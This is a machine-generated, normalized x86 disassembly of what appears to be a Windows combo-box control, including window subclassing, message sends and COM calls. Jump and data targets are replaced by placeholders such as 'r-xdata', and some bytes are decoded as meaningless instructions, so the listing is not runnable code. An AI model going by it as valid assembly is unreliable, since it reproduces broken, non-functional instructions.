mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
lea edi [ ebp - 0x2d ]
mov ecx 0xa
[ edi ] [ esi ]
mov esi eax
xor eax eax
push ebp
push sub_43ba4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x2d ]
test bl 0x4
je r-xdata
cmp [ esi + 0x244 ] 0x0
je r-xdata
mov ebx [ ebp - 0xd ]
jmp r-xdata
mov edx [ ebp - 0x29 ]
mov eax [ esi + 0x22c ]
call sub_43b764
mov ebx eax
cmp [ ebp - 0x29 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ba54
lea eax [ ebp - 0x4 ]
call sub_404038
retn
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ebx [ esi + 0x28c ]
jmp r-xdata
mov eax ebx
call sub_43b8e0
mov [ ebp - 0x5 ] al
mov eax [ esi + 0x28c ]
mov edx [ ebp - 0x29 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0xd ]
mov [ eax + 0xc ] edx
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test [ ebp - 0x5 ] 0x1
je r-xdata
lea eax [ ebp - 0x4 ]
call sub_404038
cmp [ ebp - 0x19 ] 0x0
je r-xdata
test [ ebp - 0x5 ] 0x10
je r-xdata
mov eax [ esi + 0x28c ]
mov edx [ ebp - 0x11 ]
mov [ eax + 0x10 ] edx
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x19 ]
call sub_408c2c
jmp r-xdata
mov cl [ ebp - 0x5 ]
mov edx [ esi + 0x28c ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x114 ]
mov ebx [ esi + 0x28c ]
jmp r-xdata
mov eax [ esi + 0x28c ]
mov edx [ ebp - 0x9 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x28c ]
add eax 0x24
mov edx [ ebp - 0x4 ]
call sub_40408c
test [ ebp - 0x5 ] 0x2
je r-xdata
sub_43ba60
push ebx
mov ebx eax
mov eax ebx
call sub_4533bc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_4530b8
mov edx sub_43b848
xor ecx ecx
call sub_42c6d4
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_43ba9c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_4533bc
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x295 ] 0x0
jne r-xdata
mov eax [ ebx + 0x23c ]
call sub_419748
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_43badc
inc edi
dec esi
jne r-xdata
sub_43badc
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov ebp edx
mov ebx eax
mov eax ebx
call sub_4533bc
test al al
je r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_43b44c
mov edi eax
mov [ esp + 0x1 ] 0x15
mov eax [ edi + 0x1c ]
mov [ esp + 0x19 ] eax
mov eax [ edi + 0x10 ]
call sub_4044f8
mov [ esp + 0xd ] eax
mov al [ edi + 0xc ]
mov [ esp ] al
mov eax edi
call sub_4193b8
test eax eax
je r-xdata
xor eax eax
mov [ esp + 0x5 ] eax
mov eax ebx
mov si 0xffc8
call sub_4034a4
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ esp ]
mov eax [ eax + edx * 4 ]
mov [ esp + 0x5 ] eax
jmp r-xdata
and [ esp + 0x1 ] 0xffffffef
mov eax [ esp + 0x5 ]
or eax 0x800
or eax 0x8000
mov [ esp + 0x5 ] eax
jmp r-xdata
cmp [ edi + 0x1c ] 0xffffffff
je r-xdata
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_43b44c
mov eax [ eax + 0x28 ]
push eax
mov eax ebx
call sub_4530b8
lea ecx [ esp + 0x5 ]
pop edx
call sub_42c634
cmp [ ebx + 0x215 ] 0x2
jne r-xdata
or [ esp + 0x1 ] 0x2
mov [ esp + 0x9 ] eax
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_43b44c
mov eax [ eax + 0x28 ]
push eax
mov eax ebx
call sub_4530b8
lea ecx [ esp + 0x5 ]
pop edx
call sub_42c634
jmp r-xdata
mov eax [ edi + 0x24 ]
cmp eax 0xffffffff
jle r-xdata
cmp [ ebx + 0x215 ] 0x3
jne r-xdata
mov eax ebx
call sub_4530b8
mov ecx [ edi + 0x24 ]
or edx 0xffffffff
call sub_42c650
jmp r-xdata
cmp [ ebx + 0x244 ] 0x0
jne r-xdata
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_43b44c
mov eax [ eax + 0x28 ]
push eax
mov eax ebx
call sub_4530b8
mov ecx [ edi + 0x24 ]
pop edx
call sub_42c650
sub_43bc2c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_439df4
mov edi esi
mov eax [ edi + 0x1c ]
mov [ ebx + 0x1c ] eax
mov eax [ edi + 0x24 ]
mov [ ebx + 0x24 ] eax
mov eax [ edi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
lea eax [ ebx + 0x10 ]
mov edx [ edi + 0x10 ]
call sub_40408c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43bc78
push ebx
mov ebx eax
mov eax ebx
call sub_439ef4
mov eax ebx
call sub_4193b8
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx [ ebx + 0x4 ]
mov al [ edx + 0x1d ]
cmp al 0x2
je r-xdata
mov eax edx
call sub_43a0ec
cmp al 0x3
jne r-xdata
pop ebx
retn
sub_43bcac
push ebx
mov ebx eax
mov eax ebx
call sub_439f10
mov eax ebx
call sub_4193b8
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx [ ebx + 0x4 ]
mov al [ edx + 0x1d ]
cmp al 0x1
je r-xdata
mov eax edx
call sub_43a0ec
cmp al 0x3
jne r-xdata
pop ebx
retn
sub_43bd00
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp eax 0xffffffff
je r-xdata
mov [ ebx + 0x1c ] edx
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax ebx
call sub_439f1c
mov eax ebx
call sub_4193b8
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_43bd30
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4194e0
mov edx esi
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop esi
pop ebx
retn
sub_43bd90
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax esi
call sub_43bd84
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx [ ebp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp + 0xc ]
mov [ ebx + 0x24 ] eax
mov edx [ ebp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax ebx
call sub_4193b8
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
sub_43be0c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_419948
mov ebp eax
mov esi ebx
mov eax edi
call sub_419748
mov ebx eax
dec ebx
sub ebx esi
jl r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x2c ]
inc esi
dec ebx
jne r-xdata
sub_43be44
push ebx
push esi
mov ebx edx
mov esi eax
sub cl 0x1
jb r-xdata
mov esi ebx
mov [ esi + 0x18 ] 0xffffffff
mov [ esi + 0x1c ] 0xffffffff
mov [ esi + 0x24 ] 0xffffffff
mov [ esi + 0x20 ] 0xffffffff
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x10 ]
call sub_404038
pop esi
pop ebx
retn
sub cl 0x2
jb r-xdata
mov eax esi
call sub_419a58
test [ eax + 0x1c ] 0x8
jne r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
call sub_4193b8
push eax
push 0x144
mov eax esi
call sub_419a58
call sub_4530b8
push eax
call SendMessageA
sub_43beb8
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov edi edx
mov esi eax
mov eax esp
xor ecx ecx
mov edx 0x24
call sub_402cbc
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0xc ] eax
mov eax esp
push eax
push 0x0
push 0x404
mov eax esi
call sub_419a58
call sub_4530b8
push eax
call SendMessageA
test eax eax
sete al
neg al
sbb ebp ebp
mov edx edi
mov eax esi
call sub_43bdf8
mov ebx eax
mov [ esp ] 0x37
mov eax [ ebx + 0x10 ]
call sub_4044f8
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_4193b8
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_4042f8
mov [ esp + 0xc ] eax
mov eax [ ebx + 0x18 ]
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x1c ]
mov [ esp + 0x14 ] eax
mov eax [ ebx + 0x20 ]
mov [ esp + 0x18 ] eax
mov eax [ ebx + 0x24 ]
mov [ esp + 0x1c ] eax
mov eax [ ebx + 0x14 ]
mov [ esp + 0x20 ] eax
test ebp ebp
je r-xdata
mov eax esp
push eax
push edi
push 0x405
mov eax esi
call sub_419a58
call sub_4530b8
push eax
call SendMessageA
mov eax esp
push eax
push edi
push 0x401
mov eax esi
call sub_419a58
call sub_4530b8
push eax
call SendMessageA
jmp r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43c084
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax 0x200
call sub_43b3c4
mov ecx esi
xor edx edx
mov eax ebx
call sub_4433dc
push ebx
push sub_43c524
call sub_46410c
mov [ ebx + 0x278 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43cbfc
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10c ]
mov eax [ ebx + 0x23c ]
mov [ eax + 0x10 ] ebx
mov eax [ eax + 0x14 ]
mov [ ebx + 0x28c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov esi eax
mov [ ebx + 0x27c ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_43c380
mov [ ebx + 0x289 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x26c ] al
cmp [ rw-data ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_40360c
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x1
push r-xdata
call GetModuleHandleA
mov esi eax
test esi esi
je r-xdata
push 0x0
call CoInitialize
push 0x2
push 0x0
call [ rw-data ]
jmp r-xdata
push r-xdata
push esi
call GetProcAddress
mov [ rw-data ] eax
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_43c1ab
add [ ebx + 0x56 ] dl
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x23c ]
call sub_4032a8
lea eax [ esi + 0x27c ]
call sub_40d4f0
mov eax esi
call sub_4533bc
test al al
je r-xdata
mov eax [ esi + 0x278 ]
call sub_464120
lea eax [ esi + 0x284 ]
call sub_40d4f0
lea eax [ esi + 0x268 ]
call sub_405934
call CoUninitialize
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4434d0
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_43c224
push esi
mov esi eax
mov eax [ edx + 0x8 ]
mov eax [ eax + 0x8 ]
sub eax 0xfffffcdb
je r-xdata
cmp [ esi + 0x29a ] 0x0
je r-xdata
dec eax
jne r-xdata
pop esi
retn
mov edx esi
mov eax [ esi + 0x29c ]
call [ esi + 0x298 ]
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x292 ] 0x0
je r-xdata
mov edx esi
mov eax [ esi + 0x294 ]
call [ esi + 0x290 ]
pop esi
retn
sub_43c274
push ebx
push esi
mov ebx edx
mov esi eax
mov eax 0x200
call sub_43b398
mov edx ebx
mov eax esi
call sub_44ff44
mov ecx r-xdata
mov edx ebx
mov eax esi
call sub_44fe70
mov eax [ ebx + 0x4 ]
or eax 0x10000
or eax 0x200000
or eax 0x2000000
or eax 0x4
or eax 0x40
xor edx edx
mov dl [ esi + 0x289 ]
or eax [ edx * 4 + rw-data ]
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfffffdff
mov eax [ ebx + 0x24 ]
or eax 0x8
and eax 0xfffffffc
mov [ ebx + 0x24 ] eax
pop esi
pop ebx
retn
sub_43c2ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x280 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x280 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x27c ]
call sub_45aef0
mov eax ebx
call sub_4533bc
test al al
je r-xdata
mov edx [ ebx + 0x27c ]
call sub_45af34
mov edx ebx
mov eax [ ebx + 0x280 ]
call sub_421018
mov eax ebx
call sub_4533bc
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0x402
mov eax ebx
call sub_44da78
mov eax ebx
call sub_450658
mov eax [ ebx + 0x280 ]
call sub_45a1b4
push eax
push 0x0
push 0x402
mov eax ebx
call sub_4530b8
push eax
call PostMessageA
pop esi
pop ebx
retn
sub_43c380
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4533bc
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_45a1b4
push eax
xor ecx ecx
mov edx 0x402
mov eax ebx
call sub_44da78
sub_43c3ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_443b88
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x289 ] 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_424ca4
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_43c3f4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44bd1c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x280 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_43c2ec
sub_43c424
push ebx
mov ebx eax
mov eax ebx
call sub_44e49c
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x289 ] 0x2
jae r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43c44c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4525ec
mov eax ebx
call sub_4533bc
test al al
je r-xdata
add esp 0x10
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x270 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x240 ]
test eax eax
je r-xdata
push 0x0
lea edx [ esp + 0x4 ]
push edx
push eax
call InvalidateRect
push 0x0
lea edx [ esp + 0x4 ]
push edx
push eax
call InvalidateRect
sub_43c4ac
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_44df48
mov eax ebx
call sub_44ca9c
test al al
je r-xdata
cmp [ ebx + 0x289 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_464294
test eax eax
je r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
cmp ebx [ eax + 0x220 ]
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_44cf6c
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_44caac
sub_43c544
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43c857
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_443fac
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call GetWindow
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x248 ] ebx
mov esi ebx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x270 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x274 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
call SetWindowLongA
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x289 ]
sub al 0x2
jae r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call GetWindow
push eax
call GetWindow
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x284 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x240 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x289 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x280 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x288 ] 0x1
xor eax eax
push ebp
push sub_43c75b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x284 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
call sub_419748
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
mov esi ebx
mov [ eax + 0x240 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x250 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
push eax
call SetWindowLongA
mov eax [ ebp - 0x4 ]
mov esi ebx
mov [ eax + 0x244 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x258 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
push eax
call SetWindowLongA
push 0x2
push ebx
call GetWindow
mov ebx eax
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x28a ]
mov eax [ ebp - 0x4 ]
call sub_43c890
mov eax [ ebp - 0x4 ]
add eax 0x268
call sub_405934
mov eax [ ebp - 0x4 ]
add eax 0x268
call sub_405934
push eax
push sub_43c864
push 0x1
push 0x0
mov eax [ rw-data ]
push eax
call CoCreateInstance
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x268 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_45a1b4
push eax
push 0x0
push 0x402
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call PostMessageA
mov eax [ ebp - 0x4 ]
add eax 0x284
call sub_40d4f0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_44c968
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x288 ] 0x0
retn
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c85e
lea eax [ ebp - 0x8 ]
call sub_405934
retn
push 0x0
push 0x0
push 0x407
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call SendMessageA
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d01c
mov edx eax
test edx edx
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_40594c
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43ca24
sub edx 0xffffffec
sub_43c890
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
xor edi edi
mov al [ esp ]
mov [ ebx + 0x28a ] al
mov eax ebx
call sub_4533bc
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov esi rw-data
jae r-xdata
and edx 0x7f
bt [ ebx + 0x28a ] edx
inc eax
add esi 0x4
cmp al 0x5
jne r-xdata
or edi [ esi ]
mov edx eax
cmp dl 0x7
ja r-xdata
push edi
push 0x0
push 0x40e
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
sub_43c8f0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_453b88
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0xa4 ]
mov eax edi
call sub_43c2ec
cmp [ edi + 0x280 ] 0x0
jne r-xdata
mov edx [ esi + 0xc8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
test bl bl
je r-xdata
sub_43c954
push ebx
mov ebx eax
mov eax ebx
call sub_444194
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4533bc
test al al
je r-xdata
mov eax ebx
call sub_450658
sub_43c998
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28c ]
call sub_419748
test eax eax
jle r-xdata
mov eax ebx
call sub_450454
pop esi
pop ebx
retn
cmp [ ebx + 0x284 ] 0x0
jne r-xdata
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419510
mov esi eax
mov [ ebx + 0x284 ] esi
mov edx [ ebx + 0x28c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_43c9e8
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4533bc
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
cmp eax [ esi + 0x270 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_43ca24
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43cb21
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4533bc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cb28
lea eax [ ebp - 0x4 ]
call sub_405934
retn
cmp [ ebx + 0x268 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
call sub_405934
mov ecx eax
mov edx sub_43cb2c
mov eax [ ebx + 0x268 ]
call sub_40d500
test al al
je r-xdata
test [ ebx + 0x26c ] 0x1
setne al
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x268 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov al [ r-xdata ]
cmp al [ ebx + 0x26c ]
jne r-xdata
xor eax eax
test [ ebx + 0x26c ] 0x1
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
jmp r-xdata
test [ ebx + 0x26c ] 0x2
je r-xdata
or eax 0x1
test [ ebx + 0x26c ] 0x4
je r-xdata
or eax 0x2
test [ ebx + 0x26c ] 0x8
je r-xdata
or eax 0x4
test [ ebx + 0x26c ] 0x10
je r-xdata
or eax 0x8
test [ ebx + 0x26c ] 0x20
je r-xdata
or eax 0x10
test [ ebx + 0x26c ] 0x40
je r-xdata
or eax 0x20
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
jmp r-xdata
or eax 0x40
sub_43cb2c
ror [ ebx - 0x40 ] 0xea
xchg ecx eax
aaa
rcl [ ecx ] cl
mov ebx 0x97600095
jpo r-xdata
retn
dec esp
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov eax [ eax + 0x14 ]
call sub_43bd84
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax ebx
call sub_4193b8
pop esi
pop ebx
retn
sub_43cb64
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov eax [ eax + 0x14 ]
call sub_43bd84
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax ebx
call sub_4193b8
pop edi
pop esi
pop ebx
retn
sub_43cb94
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_43cbf2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_419674
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_4533bc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cbf9
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_450658
sub_43cbfc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403278
mov eax edi
mov edx [ eax ]
call [ edx + 0x84 ]
push eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x80 ]
mov ecx esi
mov dl 0x1
call sub_43a0f8
mov [ edi + 0x14 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_43cc58
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
lea eax [ esi + 0x14 ]
call sub_40d4f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419ad8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_43cc94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43cdd1
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_43a0c0
mov edx [ eax + 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_4040d0
mov edx esi
